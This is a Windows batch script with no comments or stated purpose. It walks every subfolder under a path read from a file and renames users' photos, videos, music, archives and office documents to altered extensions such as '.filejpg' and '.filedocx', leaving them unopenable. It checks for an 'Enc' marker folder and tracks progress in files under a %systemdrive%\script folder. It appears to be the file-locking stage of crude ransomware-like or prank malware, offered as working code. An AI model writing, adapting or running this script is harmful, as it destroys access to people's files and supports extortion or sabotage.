@echo off
echo.
setlocal enableDelayedExpansion
md %systemdrive%\script
echo 1 >%systemdrive%\script\counter.txt
cls
for /f "Delims=" %%a in (Pathe6) do (
set st=%%a
)
if exist %st%\Enc goto term
dir /a:d /s /b "%st%" >%systemdrive%\script\print.txt
echo %st%>>%systemdrive%\script\print.txt
cls
set /a co=0
:Loop

set /a co+=1
echo %co% >123
for /f "Delims=" %%a in (123) do (
set countfile=%%a
)
if %countfile%==10 goto term

set /a count=0
for /F "tokens=*" %%A in (%systemdrive%\script\print.txt) do (
set /a count+=1
set File[!count!]=%%A
)

set /a count=0
:repeat
find /c "!count!" %systemdrive%\script\counter.txt && goto process
set /a count+=1
goto repeat

:process
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.jpg" "*.filejpg"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.jpeg" "*.filejpg"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.mp4" "*.filemp4"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.zip" "*.filezip"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.rar" "*.filerar"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.png" "*.filepng"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.bmp" "*.filebmp"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.mkv" "*.filemkv"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.docx" "*.filedocx"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.amv" "*.fileamv"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.mp3" "*.filemp3"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.ppt" "*.fileppt"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.txt" "*.filetxt"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.xlsm" "*.filexlsm"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.xls" "*.filexls"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.xltm" "*.filexltm"
for /F "tokens=2 delims==" %%s in ('set File[!count!]') do ren "%%s\*.wav" "*.filewav"
::move "%st%\%num%.jpg" %st1%
cls
set /a count+=1
echo !count! >%systemdrive%\script\counter.txt
goto Loop
:term 
exit